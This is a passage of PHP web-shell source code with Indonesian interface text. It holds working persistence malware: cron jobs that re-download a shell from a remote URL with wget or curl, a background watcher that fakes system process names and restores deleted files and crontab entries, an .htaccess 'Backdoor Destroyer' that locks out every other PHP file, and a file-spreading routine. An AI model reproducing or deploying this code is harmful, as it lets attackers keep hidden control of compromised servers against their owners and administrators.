call_user_func($dirname_fn, $file_target_get) . DIRECTORY_SEPARATOR . $new_name_get; $file_exists_local_check_get_rename_action_get = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists'); if (call_user_func($file_exists_local_check_get_rename_action_get, $new_path_target_get)) { $error_messages[] = "Rename Error: Nama '" . call_user_func($htmlspecialchars_fn, $new_name_get) . "' sudah ada."; } elseif (!empty($rename_fn_action_get) && @call_user_func($rename_fn_action_get, $file_target_get, $new_path_target_get)) { $output_messages[] = "'" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' di-rename ke '" . call_user_func($htmlspecialchars_fn, $new_name_get) . "'."; if (call_user_func($function_exists_fn, $realpath_fn) && @call_user_func($realpath_fn, $file_target_get) == @call_user_func($realpath_fn, $current_path)) { $_SESSION['current_explorer_path'] = $new_path_target_get; header("Location: " . $_SERVER['PHP_SELF'] . "?menu=explorer&path=" . urlencode($new_path_target_get)); exit; } } else { $error_messages[] = "Gagal rename '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'."; } } } elseif ($file_action_get === 'download' && !call_user_func($is_dir_fn, $file_target_get)) { $header_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_header', 'header'); $filesize_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_filesize', 'filesize'); $readfile_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_readfile', 'readfile'); $is_readable_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable'); if (empty($is_readable_fn_get_dl_action_get_final) || !call_user_func($function_exists_fn, $is_readable_fn_get_dl_action_get_final) || !@call_user_func($is_readable_fn_get_dl_action_get_final, $file_target_get)) { $error_messages[] = "Download Error: File tidak readable."; } elseif (!empty($header_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $header_fn_get_dl_action_get_final) && !empty($readfile_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $readfile_fn_get_dl_action_get_final)) { if (headers_sent($file_header_get_dl_action_sent_get_final, $line_header_get_dl_action_sent_get_final)) { $error_messages[] = "Download Error: Headers already sent."; } else { @ob_end_clean(); @ini_set('zlib.output_compression', 'Off'); call_user_func($header_fn_get_dl_action_get_final, 'Content-Description: File Transfer'); call_user_func($header_fn_get_dl_action_get_final, 'Content-Type: application/octet-stream'); call_user_func($header_fn_get_dl_action_get_final, 'Content-Disposition: attachment; filename="' . call_user_func($basename_fn, $file_target_get) . '"'); call_user_func($header_fn_get_dl_action_get_final, 'Expires: 0'); call_user_func($header_fn_get_dl_action_get_final, 'Cache-Control: must-revalidate'); call_user_func($header_fn_get_dl_action_get_final, 'Pragma: public'); if(!empty($filesize_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $filesize_fn_get_dl_action_get_final)) { $fsize_get_dl_action_get_final = @call_user_func($filesize_fn_get_dl_action_get_final, $file_target_get); if ($fsize_get_dl_action_get_final !== false) call_user_func($header_fn_get_dl_action_get_final, 'Content-Length: ' . $fsize_get_dl_action_get_final); } flush(); $readfile_result_get_dl_action_get_final = @call_user_func($readfile_fn_get_dl_action_get_final, $file_target_get); exit; } } else { $error_messages[] = "Download Error: Fungsi header/readfile tidak ada."; } } elseif ($file_action_get === 'edit' && !call_user_func($is_dir_fn, $file_target_get)) { $active_menu = 'editor'; } elseif ($file_action_get === 'lock') { $is_self_lock = (isset($_GET['self']) && $_GET['self'] == 1); $target_to_lock = $is_self_lock ? __FILE__ : $file_target_get; $result_message = lock_file_or_shell($target_to_lock, $is_self_lock); if (strpos($result_message, 'Sukses') === 0) { $output_messages[] = $result_message; } else { $error_messages[] = $result_message; } } elseif ($file_action_get === 'unlock') { $result_message = unlock_shell(); if (strpos($result_message, 'Sukses') === 0) { $output_messages[] = $result_message; } else { $error_messages[] = $result_message; } } elseif ($file_action_get === 'unzip' && !call_user_func($is_dir_fn, $file_target_get)) { if (strtolower(pathinfo($file_target_get, PATHINFO_EXTENSION)) !== 'zip') { $error_messages[] = "Unzip Error: Target bukan file .zip."; } elseif (!class_exists('ZipArchive')) { $error_messages[] = "Unzip Error: Class 'ZipArchive' tidak ditemukan."; } else { $zip = new ZipArchive; if ($zip->open($file_target_get) === TRUE) { if ($zip->extractTo($current_path)) { $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' berhasil di-unzip."; } else { $error_messages[] = "Unzip Error: Gagal mengekstrak file."; } $zip->close(); } else { $error_messages[] = "Unzip Error: Gagal membuka file arsip."; } } } } elseif (isset($_GET['file_action']) && empty($error_messages)) { $error_messages[] = "Aksi file dibatalkan: Target tidak valid."; } }

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $action_post = isset($_POST['action']) ? $_POST['action'] : null;

    if ($action_post === 'update_security_config' && $active_menu === 'security_config') {
        $current_config_content = @file_get_contents($security_config_file);
        $current_config = $current_config_content ? @json_decode($current_config_content, true) : [];
        if (json_last_error() !== JSON_ERROR_NONE) { $current_config = []; }
        $current_config['ip_enabled'] = isset($_POST['ip_enabled']);
        $allowed_ips = isset($current_config['allowed_ips']) && is_array($current_config['allowed_ips']) ? $current_config['allowed_ips'] : [];
        if (isset($_POST['add_ip']) && !empty(trim($_POST['add_ip']))) {
            $new_ip = trim($_POST['add_ip']);
            if (filter_var($new_ip, FILTER_VALIDATE_IP) && !in_array($new_ip, $allowed_ips)) {
                $allowed_ips[] = $new_ip;
            }
        }
        if (isset($_POST['remove_ips']) && is_array($_POST['remove_ips'])) {
            $allowed_ips = array_diff($allowed_ips, $_POST['remove_ips']);
        }
        $current_config['allowed_ips'] = array_values($allowed_ips); 
        if (@file_put_contents($security_config_file, json_encode($current_config, JSON_PRETTY_PRINT))) {
            $output_messages[] = "Konfigurasi keamanan berhasil disimpan.";
        } else {
            $error_messages[] = "Gagal menyimpan konfigurasi. Pastikan file '{$security_config_file}' writable.";
        }
        } elseif ($action_post === 'setup_cron' && $active_menu === 'cron') {
    // Ambil dan bersihkan input dari form
    $shell_filename = isset($_POST['shell_filename_cron']) ? trim(basename($_POST['shell_filename_cron'])) : '';
    $shell_url = isset($_POST['url_cron']) ? trim($_POST['url_cron']) : '';
    $target_path = $auto_path_script; // Path tempat file ini berada

    // Validasi input
    if (empty($shell_filename) || empty($shell_url)) {
        $error_messages[] = "Nama file dan URL shell wajib diisi.";
    } elseif (filter_var($shell_url, FILTER_VALIDATE_URL) === false) {
        $error_messages[] = "URL shell tidak valid.";
    } elseif (!is_writable($target_path)) {
        $error_messages[] = "Direktori target tidak dapat ditulis (not writable): " . htmlspecialchars($target_path);
    } else {
        // Jika validasi lolos, lanjutkan proses
        $full_file_path = rtrim($target_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $shell_filename;

        // 1. Download konten shell dari URL
        $shell_content = @file_get_contents($shell_url);
        if ($shell_content === false) {
            $error_messages[] = "Gagal mengunduh konten dari URL: " . htmlspecialchars($shell_url);
        } else {
            // 2. Tulis konten ke file
            if (@file_put_contents($full_file_path, $shell_content) === false) {
                $error_messages[] = "Gagal menyimpan file ke: " . htmlspecialchars($full_file_path);
            } else {
                @chmod($full_file_path, 0444); // Atur izin menjadi read-only
                $output_messages[] = "Sukses: File shell '" . htmlspecialchars($shell_filename) . "' berhasil dibuat di direktori ini.";

                // 3. Buat perintah cron menggunakan fungsi pengganti
                $safe_file_path = custom_escapeshellarg($full_file_path);
                $safe_shell_url = custom_escapeshellarg($shell_url);
                $wget_or_curl = (try_execute_command('command -v wget') ? "wget -qO" : "curl -sLo");
                $cron_command = "*/5 * * * * if [ ! -f {$safe_file_path} ]; then {$wget_or_curl} {$safe_file_path} {$safe_shell_url}; chmod 0444 {$safe_file_path}; fi #CRON_PERSISTENCE";
                
                // 4. Tambahkan perintah ke crontab
                $current_crontab = try_execute_command('crontab -l');
                if (strpos($current_crontab, $cron_command) === false) {
                    $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                    file_put_contents($temp_cron_file, $current_crontab . "\n" . $cron_command . "\n");
                    try_execute_command('crontab ' . custom_escapeshellarg($temp_cron_file));
                    @unlink($temp_cron_file);
                    $output_messages[] = "Sukses: Cron job untuk menjaga file '" . htmlspecialchars($shell_filename) . "' berhasil ditambahkan.";
                } else {
                    $output_messages[] = "Info: Cron job untuk file ini sudah ada.";
                }
            }
        }
    }
    } elseif ($action_post === 'start_protection' && $active_menu === 'dynamic_cache_manager') {
        
        function find_php_cli_binary() {
            $common_paths = ['/usr/bin/php', '/usr/local/bin/php', '/bin/php', 'php'];
            foreach (['8.2', '8.1', '8.0', '7.4', '7.3', '7.2'] as $version) {
                $v = str_replace('.', '', $version);
                array_unshift($common_paths, "/usr/bin/php{$version}", "/usr/local/bin/php{$version}", "/opt/remi/php{$v}/root/usr/bin/php");
            }
            if (defined('PHP_BINARY') && !empty(PHP_BINARY)) {
                $output = @shell_exec(escapeshellarg(PHP_BINARY) . ' -v');
                if ($output && stripos($output, 'cli') !== false) return PHP_BINARY;
            }
            foreach (array_unique($common_paths) as $path) {
                $output = @shell_exec('command -v ' . escapeshellarg($path));
                if (!empty($output)) {
                    $path = trim($output);
                    $version_output = @shell_exec(escapeshellarg($path) . ' -v');
                    if ($version_output && stripos($version_output, 'cli') !== false) return $path;
                }
            }
            return false;
        }
        
        function deploy_layer4_watcher($cron_commands_to_rebuild, $watcher_name, $php_binary, &$output_messages, &$error_messages) {
            $doc_root = $_SERVER['DOCUMENT_ROOT'];
            if (!is_readable($doc_root) || !is_dir($doc_root)) {
                $error_messages[] = "Lapis 4: Gagal membaca Document Root.";
                return;
            }
            
            $watcher_filepath = $doc_root . DIRECTORY_SEPARATOR . $watcher_name;
            $cron_content = implode("\n", $cron_commands_to_rebuild) . "\n";
            
            $watcher_code = '<?php $c = ' . var_export($cron_content, true) . '; $cc = @shell_exec("crontab -l"); if (strpos($cc, $c) === false) { $t = tempnam("/tmp", "c"); file_put_contents($t, $c); shell_exec("crontab " . $t); @unlink($t); } ?>';

            if (@file_put_contents($watcher_filepath, $watcher_code)) {
                @chmod($watcher_filepath, 0444);
                
                $new_cron_line = "*/5 * * * * " . escapeshellarg($php_binary) . " " . escapeshellarg($watcher_filepath);
                
                $current_crontab = @shell_exec('crontab -l');
                if (strpos($current_crontab, $new_cron_line) === false) {
                    @shell_exec('(crontab -l 2>/dev/null; echo ' . escapeshellarg($new_cron_line) . ') | crontab -');
                }
                $_SESSION['l4_watcher_path'] = $watcher_filepath;
                $output_messages[] = "Lapis 4: Watcher mandiri berhasil ditanam di <strong>{$watcher_filepath}</strong> dan dijadwalkan di cron.";
            } else {
                $error_messages[] = "Lapis 4: Gagal membuat file watcher di '{$watcher_filepath}'.";
            }
        }

        $targets = $_POST['targets'] ?? [];
        $urls = $_POST['urls'] ?? [];
        $interval = (int)($_POST['interval'] ?? 5);
        if ($interval < 2) $interval = 2;
        
        $filesToProtect = [];
        $cronCommandsToAdd = [];
        $php_binary_path = find_php_cli_binary();
        
        $cache_base_dir = null;
        $tmp_path = '/tmp';
        
        if (is_path_allowed_by_basedir($tmp_path) && @is_writable($tmp_path)) {
            $cache_base_dir = $tmp_path . DIRECTORY_SEPARATOR . $dynamic_names['dir_name'];
            $log_filepath = $tmp_path . DIRECTORY_SEPARATOR . bin2hex(random_bytes(6)) . '.log';
        } else {
            $cache_base_dir = __DIR__ . DIRECTORY_SEPARATOR . $dynamic_names['dir_name'];
            $log_filepath = $cache_base_dir . DIRECTORY_SEPARATOR . $dynamic_names['log_name'];
        }
        
        $cache_script_filepath = $cache_base_dir . DIRECTORY_SEPARATOR . $dynamic_names['script_name'];
        
        if (!is_dir($cache_base_dir)) {
            if (!@mkdir($cache_base_dir, 0777, true)) {
                $error_messages[] = "Gagal membuat direktori cache di '{$cache_base_dir}'. Periksa izin tulis.";
            } else {
                 @chmod($cache_base_dir, 0777);
                 if (strpos($cache_base_dir, __DIR__) === 0) {
                      @file_put_contents($cache_base_dir . '/.htaccess', 'Deny from all');
                 }
            }
        } else {
            @chmod($cache_base_dir, 0777);
        }

        $unique_cron_instance_id = bin2hex(random_bytes(4));

        for ($i = 0; $i < count($targets); $i++) {
            if (!empty($targets[$i]) && !empty($urls[$i]) && filter_var($urls[$i], FILTER_VALIDATE_URL)) {
                $full_target_path = $targets[$i];
                if (strtolower($full_target_path) === '__file__') {
                    $full_target_path = __FILE__;
                } elseif (strpos($full_target_path, DIRECTORY_SEPARATOR) === false && !empty($full_target_path)) {
                    $full_target_path = __DIR__ . DIRECTORY_SEPARATOR . $full_target_path;
                }
                
                if (!is_file($full_target_path) && !is_dir(dirname($full_target_path))) {
                    error_log("CACHE_MANAGER_SKIP: Target '{$targets[$i]}' tidak valid.");
                    continue;
                }

                $filesToProtect[] = ['target' => $full_target_path, 'backupUrl' => $urls[$i]];
                $cronCommandsToAdd = array_merge($cronCommandsToAdd, generateMutualProtectionCronCommands($cache_script_filepath, $full_target_path, $urls[$i], $php_binary_path ?: 'php', $unique_cron_instance_id, $dynamic_names, $log_filepath));
            }
        }
        $cronCommandsToAdd = array_unique($cronCommandsToAdd);

        if (empty($filesToProtect) && empty($error_messages)) {
            $error_messages[] = "Tidak ada target valid.";
        }
        
        if (!empty($filesToProtect) && empty($error_messages)) {
            $filesToProtectPHPCode = var_export($filesToProtect, true);
            $cronCommandsPHPCode = var_export($cronCommandsToAdd, true);
            $dynamicNamesPHPCode = var_export($dynamic_names, true);
            $fakeProcessTitles = var_export(['/usr/sbin/apache2 -k start', '[kworker/u8:2]', '[rcu_sched]', 'nginx: worker process', 'php-fpm: pool www', '/usr/sbin/sshd -D'], true);

            // [PERBAIKAN] Template skrip watcher dengan `flock` dan logika izin yang benar
            $cache_code = <<<EOT
<?php
set_time_limit(0);
ignore_user_abort(true);
date_default_timezone_set('Asia/Jakarta');

if (function_exists('cli_set_process_title')) {
    \$fake_titles = $fakeProcessTitles;
    @cli_set_process_title(\$fake_titles[array_rand(\$fake_titles)]);
}

// [PERBAIKAN] Gunakan flock untuk mencegah proses ganda
\$lock_file = __FILE__ . '.lock';
\$lock_handle = fopen(\$lock_file, 'c');
if (!\$lock_handle || !flock(\$lock_handle, LOCK_EX | LOCK_NB)) {
    echo "[".date("H:i:s")."] ⚠️  Proses lain sudah berjalan. Keluar.\\n";
    exit;
}

\$filesToProtect = $filesToProtectPHPCode;
\$cronCommandsToEnsure = $cronCommandsPHPCode;
\$dynamic_names = $dynamicNamesPHPCode;
\$interval = $interval;

function is_shell_exec_available() {
    if (!function_exists('shell_exec')) return false;
    \$disabled = ini_get('disable_functions');
    if (\$disabled) {
        \$disabled_arr = array_map('trim', explode(',', \$disabled));
        return !in_array('shell_exec', \$disabled_arr);
    }
    return true;
}

function fetchContent(\$url) {
    if (!function_exists('curl_init')) {
        echo "[".date("H:i:s")."] ❌ Ekstensi cURL tidak tersedia.\\n";
        return false;
    }
    \$ch = curl_init(\$url);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt(\$ch, CURLOPT_TIMEOUT, 20);
    curl_setopt(\$ch, CURLOPT_USERAGENT, 'CacheManager/1.1');
    \$data = curl_exec(\$ch);
    \$http_code = curl_getinfo(\$ch, CURLINFO_HTTP_CODE);
    \$error = curl_error(\$ch);
    curl_close(\$ch);

    if (\$data === false || \$http_code !== 200) {
        echo "[".date("H:i:s")."] ❌ Gagal ambil backup dari {\$url}. HTTP:{\$http_code}. Error: {\$error}\\n";
        return false;
    }
    return \$data;
}

function ensureDirPermsRecursive(\$dirPath, \$perm = 0777, \$currentDepth = 0, \$maxDepth = 7) {
    if (\$currentDepth > \$maxDepth || !\$dirPath || \$dirPath === '.' || \$dirPath === '..' ) return;
    if (is_link(\$dirPath)) return;

    if (is_dir(\$dirPath)) {
        // [PERBAIKAN] Konversi izin ke string oktal dengan benar
        \$current_perms_octal_str = substr(sprintf('%o', @fileperms(\$dirPath)), -4);
        if (\$current_perms_octal_str !== '0777' && \$current_perms_octal_str !== '777') {
             echo "[".date("H:i:s")."] 📂 Izin dir '{\$dirPath}' adalah '{\$current_perms_octal_str}', ubah ke 0777.\\n";
             @chmod(\$dirPath, \$perm);
        }
    }

    \$parentDir = dirname(\$dirPath);
    if (\$parentDir !== \$dirPath && \$parentDir !== '/') { 
        ensureDirPermsRecursive(\$parentDir, \$perm, \$currentDepth + 1, \$maxDepth);
    }
}

function writeAndLock(\$path, \$content) {
    \$folder_of_path = dirname(\$path);
    if (!is_dir(\$folder_of_path)) {
        @mkdir(\$folder_of_path, 0777, true); 
        ensureDirPermsRecursive(\$folder_of_path, 0777); 
    }
    if (@file_put_contents(\$path, \$content) !== false) {
        @chmod(\$path, 0444); 
        return true;
    }
    return false;
}

echo "=============================================\\n";
echo "🛡️ System Cache Process Started: ".date("Y-m-d H:i:s")."\\n";
echo "🛡️ Cache Script: {\$dynamic_names['script_name']} in " . dirname(__FILE__) . "/\\n";
echo "=============================================\\n";
foreach (\$filesToProtect as \$file) {
    echo "- Target: " . \$file['target'] . "\\n  Backup: " . \$file['backupUrl'] . "\\n";
}
echo "=============================================\\n";
flush();

while (true) {
    foreach (\$filesToProtect as \$file) {
        \$targetFile = \$file['target'];
        \$backupFileUrl = \$file['backupUrl'];
        \$targetDir = dirname(\$targetFile);

        echo "[".date("H:i:s")."] 🔍 Cek: " . basename(\$targetFile);

        // [PERBAIKAN] Panggil chmod sebelum cek file
        ensureDirPermsRecursive(\$targetDir, 0777);

        if (!file_exists(\$targetFile)) {
            echo " -> 🚨 HILANG! Memulihkan...\\n";
            \$data = fetchContent(\$backupFileUrl);

            if (\$data !== false) {
                if (writeAndLock(\$targetFile, \$data)) { 
                    echo "[".date("H:i:s")."] ✅ Berhasil dipulihkan dan file dikunci ke 0444: \$targetFile\\n";
                } else {
                    echo "[".date("H:i:s")."] ❌ GAGAL menulis file ke lokasi: \$targetFile\\n";
                }
            }
        } else { 
            // [PERBAIKAN] Cek izin dengan benar
            \$current_perms_file = substr(sprintf('%o', @fileperms(\$targetFile)), -4);
            if (\$current_perms_file !== '0444' && \$current_perms_file !== '444') { 
                @chmod(\$targetFile, 0444); 
                echo " -> 🔓 Izin diubah! Mengunci ulang ke 0444.\\n";
            } else {
                echo " -> ✅ File aman.\\n";
            }
        }
        flush();
    }

    if (is_shell_exec_available()) {
        \$current_crontab = shell_exec('crontab -l 2>/dev/null');
        \$missing_crons = false;
        foreach(\$cronCommandsToEnsure as \$cron_command) {
            if (strpos(\$current_crontab, \$cron_command) === false) {
                echo "[".date("H:i:s")."] 🚨 CRON HILANG: " . htmlentities(substr(\$cron_command, 0, 70)) . "...\\n";
                \$escaped_cron_command = str_replace("'", "'\\''", \$cron_command); 
                shell_exec('(crontab -l 2>/dev/null; echo \'' . \$escaped_cron_command . '\') | crontab -');
                \$missing_crons = true;
            }
        }
        if (!\$missing_crons) {
            echo "[".date("H:i:s")."] ✅ Semua cron job aman.\\n";
        } else {
            echo "[".date("H:i:s")."] ✅ Cron job yang hilang telah dipulihkan.\\n";
        }
    } else {
        echo "[".date("H:i:s")."] ⚠️ Tidak dapat memeriksa cron job, shell_exec dinonaktifkan.\\n";
    }

    echo "------------------ Tidur selama {\$interval} detik ------------------\\n";
    flush();
    sleep(\$interval);
}

// Melepas lock saat skrip selesai
flock(\$lock_handle, LOCK_UN);
fclose(\$lock_handle);
@unlink(\$lock_file);
EOT;
            $_SESSION['cache_code_template'] = $cache_code;
            
            if (file_put_contents($cache_script_filepath, $cache_code)) {
                @chmod($cache_script_filepath, 0755);

                $process_started = false;
                $method_used = '';

                if ($php_binary_path && function_exists('shell_exec')) {
                    $escapeshellarg_fn = 'custom_escapeshellarg';
                    $safe_script_path = call_user_func($escapeshellarg_fn, $cache_script_filepath);
                    $safe_log_path = call_user_func($escapeshellarg_fn, $log_filepath);
                    $command_run = "nohup {$php_binary_path} {$safe_script_path} > {$safe_log_path} 2>&1 & echo $!";
                    $pid = shell_exec($command_run);
                    if ($pid && is_numeric(trim($pid))) {
                        $process_started = true;
                        $method_used = "Nohup (PID: " . trim($pid) . ")";
                    }
                }

                if (!$process_started && function_exists('curl_init') && function_exists('ignore_user_abort')) {
                    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
                    $url .= (strpos($url, '?') === false ? '?' : '&') . 'run_background_cache=' . urlencode($cache_script_filepath);
                    
                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $url,
                        CURLOPT_FRESH_CONNECT => true,
                        CURLOPT_TIMEOUT_MS => 500,
                        CURLOPT_NOSIGNAL => 1,
                    ]);
                    @curl_exec($ch);
                    @curl_close($ch);
                    
                    $process_started = true;
                    $method_used = "ignore_user_abort (triggered via cURL)";
                }

                if (function_exists('shell_exec')) {
                    $existing_crontab = try_execute_command('crontab -l');
                    $new_crontab_content = $existing_crontab ? trim($existing_crontab) . "\n" : "";
                    foreach ($cronCommandsToAdd as $command) {
                        if (strpos($new_crontab_content, $command) === false) {
                            $new_crontab_content .= $command . "\n";
                        }
                    }
                    $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                    file_put_contents($temp_cron_file, $new_crontab_content);
                    try_execute_command('crontab ' . escapeshellarg($temp_cron_file));
                    unlink($temp_cron_file);
                    $output_messages[] = "Jaring Pengaman: Cron job berhasil diatur/diperbarui.";
                }

                deploy_layer4_watcher($cronCommandsToAdd, $dynamic_names['watcher_name'], $php_binary_path ?: 'php', $output_messages, $error_messages);
                
                if ($process_started) {
                    $_SESSION['cache_active'] = true;
                    $_SESSION['cache_dir_path'] = $cache_base_dir;
                    $_SESSION['cache_log_path'] = $log_filepath;
                    $_SESSION['cache_script_name'] = $dynamic_names['script_name'];
                    $_SESSION['cache_cron_id'] = "#" . $dynamic_names['cron_prefix'] . $unique_cron_instance_id;
                    $output_messages[] = "Proses Cache Manager berhasil dimulai menggunakan metode: <strong>{$method_used}</strong>.";
                    $output_messages[] = "Path Skrip: {$cache_script_filepath}. Path Log: {$log_filepath}";
                } else {
                    $error_messages[] = "Gagal memulai proses latar belakang secara langsung. Hanya cron job & Lapis 4 yang berhasil diatur sebagai jaring pengaman.";
                }

            } else {
                $error_messages[] = "Gagal membuat file skrip cache di '{$cache_script_filepath}'. Pastikan direktori writable.";
            }
        }
    } elseif ($action_post === 'stop_protection' && $active_menu === 'dynamic_cache_manager') {
        if (isset($_SESSION['cache_dir_path'])) { 
            $cache_dir_to_stop = $_SESSION['cache_dir_path'];
            $log_path_to_stop = $_SESSION['cache_log_path'];
            $script_name_to_stop = $_SESSION['cache_script_name'];
            $cron_id_to_stop = $_SESSION['cache_cron_id'];
            $full_script_path_to_stop = $cache_dir_to_stop . DIRECTORY_SEPARATOR . $script_name_to_stop;

            $grep_pattern = '[' . substr($script_name_to_stop, 0, 1) . ']' . substr($script_name_to_stop, 1);
            $ps_command = "ps aux | grep '{$grep_pattern}'";
            $ps_output = try_execute_command($ps_command);

             if (!empty($ps_output)) {
                $lines = explode("\n", trim($ps_output));
                foreach ($lines as $line) {
                    if(strpos($line, $full_script_path_to_stop) !== false || strpos($line, $script_name_to_stop) !== false) {
                        $parts = preg_split('/\s+/', trim($line));
                        if (count($parts) > 1 && is_numeric($parts[1])) {
                            $pid = $parts[1];
                            try_execute_command("kill -9 {$pid}");
                            $output_messages[] = "Proses cache manager dengan PID {$pid} (skrip: {$script_name_to_stop}) berhasil dihentikan.";
                        }
                    }
                }
            } else {
                $output_messages[] = "Tidak ada proses cache manager yang cocok ditemukan, mungkin sudah berhenti.";
            }
            try_execute_command("killall -9 " . escapeshellarg($script_name_to_stop));

            $current_crontab = try_execute_command('crontab -l');
            if ($current_crontab) {
                $new_crontab_lines = [];
                $changed_crontab = false;
                $cron_prefix_to_remove = $dynamic_names['cron_prefix'];
                $watcher_name_to_remove = $dynamic_names['watcher_name'];
                foreach (explode("\n", $current_crontab) as $line) {
                    if (strpos($line, "#" . $cron_prefix_to_remove) === false && strpos($line, $watcher_name_to_remove) === false) {
                        $new_crontab_lines[] = $line;
                    } else {
                        $changed_crontab = true; 
                    }
                }
                if ($changed_crontab) {
                    $new_crontab_content = implode("\n", $new_crontab_lines); 
                    $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                    file_put_contents($temp_cron_file, $new_crontab_content);
                    try_execute_command('crontab ' . escapeshellarg($temp_cron_file)); 
                    unlink($temp_cron_file);
                    $output_messages[] = "Semua cron job terkait cache manager & watcher telah dihapus.";
                }
            }
            
            if (is_dir($cache_dir_to_stop)) {
                deleteDirectoryRecursive($cache_dir_to_stop);
            }
            if (file_exists($log_path_to_stop)) {
                @unlink($log_path_to_stop);
            }

            if(isset($_SESSION['l4_watcher_path'])) {
                if(file_exists($_SESSION['l4_watcher_path'])) {
                    @unlink($_SESSION['l4_watcher_path']);
                }
            }
            
            unset($_SESSION['cache_active'], $_SESSION['cache_dir_path'], $_SESSION['cache_log_path'], $_SESSION['cache_script_name'], $_SESSION['cache_cron_id'], $_SESSION['cache_code_template'], $_SESSION['l4_watcher_path']);
            $output_messages[] = "Direktori, file log, dan watcher cache manager telah dihapus.";
        } else {
            $error_messages[] = "Tidak ada informasi sesi cache manager yang ditemukan untuk dihentikan.";
        }
    } elseif ($action_post === 'kill_process' && $active_menu === 'process_manager') {
        $pid = (int)$_POST['pid'];
        if ($pid > 0) {
            $output = try_execute_command("kill -9 " . $pid);
            if ($output !== null) {
                $output_messages[] = "Berhasil mengirim sinyal kill ke PID {$pid}. Output: <pre>" . $htmlspecialchars_fn($output) . "</pre>";
            } else {
                $output_messages[] = "Sinyal kill telah dikirim ke PID {$pid} (tanpa output).";
            }
        } else {
            $error_messages[] = "PID tidak valid.";
        }
    } elseif ($action_post === 'deploy_destroyer' && $active_menu === 'destroyer') {
        $doc_root = $_SERVER['DOCUMENT_ROOT'];
        $self_filename = basename(__FILE__);
        if (is_writable($doc_root)) {
            $htaccess_content = "<FilesMatch \"\.(php|phtml|php3|php4|php5|php7|phps|pht|phar)$\">\n    Order Deny,Allow\n    Deny from all\n</FilesMatch>\n<Files \"{$self_filename}\">\n    Order Allow,Deny\n    Allow from all\n</Files>";
            if (@file_put_contents($doc_root . '/.htaccess', $htaccess_content)) {
                $output_messages[] = "Backdoor Destroyer (.htaccess) berhasil diterapkan di <code>" . $htmlspecialchars_fn($doc_root) . "</code>. Hanya file <code>" . $htmlspecialchars_fn($self_filename) . "</code> yang diizinkan untuk dieksekusi.";
            } else {
                $error_messages[] = "Gagal menulis .htaccess. Periksa izin tulis pada direktori root dokumen.";
            }
        } else {
            $error_messages[] = "Direktori root dokumen tidak dapat ditulis (not writable).";
        }
    } elseif ($action_post === 'manual_spread' && $active_menu === 'file_spreader') {
        $results = []; $errorMessage = ''; $successMessage = '';
        $defaultTargetDirForForm = __DIR__;
        $targetDirInputForForm = $_POST['target_dir'] ?? $defaultTargetDirForForm;
        $githubUrlInputForForm = $_POST['github_url'] ?? ''; $rawFilenameForForm = $_POST['raw_filename'] ?? ''; $rawContentForForm = $_POST['raw_content'] ?? '';
        $sourceMethodUsed = ''; $targetDirDisplay = '';
        
        $targetDirInput = trim($_POST['target_dir'] ?? ''); $targetDir = realpath($targetDirInput);
        if (empty($targetDirInput)) { $errorMessage = "❌ Direktori target wajib (sebar manual)."; error_log("FORM_DEPLOY_VALIDATE_FAIL: Target dir kosong."); }
        elseif ($targetDir === false || !is_dir($targetDir)) { $errorMessage = "❌ Direktori target manual tidak valid: " . htmlspecialchars($targetDirInput); error_log("FORM_DEPLOY_VALIDATE_FAIL: Target dir tidak valid: " . $targetDirInput); }
        elseif (!is_readable($targetDir)) { $errorMessage = "❌ Direktori target manual tidak readable: " . htmlspecialchars($targetDir); error_log("FORM_DEPLOY_VALIDATE_FAIL: Target dir tidak readable: " . $targetDir); }
        else {
            $targetDirDisplay = $targetDir; $fileUploaded = isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK;
            $githubUrlInput = trim($_POST['github_url'] ?? ''); $githubUrlProvided = !empty($githubUrlInput);
            $rawContentProvided = !empty(trim($_POST['raw_content'] ?? '')) && !empty(trim($_POST['raw_filename'] ?? ''));
            $sourcePathForCopy = null; $originalNameToUse = ''; $tempSourceToDelete = null;
            if ($fileUploaded) { $file = $_FILES['file']; $tmpPath = $file['tmp_name']; $originalName = basename($file['name']); $ext = pathinfo($originalName, PATHINFO_EXTENSION); $randomNameInitial = generateRandomName($ext); $initialUploadPath = __DIR__ . DIRECTORY_SEPARATOR . $randomNameInitial; if (move_uploaded_file($tmpPath, $initialUploadPath)) { $sourcePathForCopy = $initialUploadPath; $originalNameToUse = $originalName; $tempSourceToDelete = $initialUploadPath; $sourceMethodUsed = 'upload'; } else { $errorMessage = "❌ Gagal pindah file upload."; error_log("FORM_DEPLOY_SOURCE_FAIL: Gagal move_uploaded_file."); }
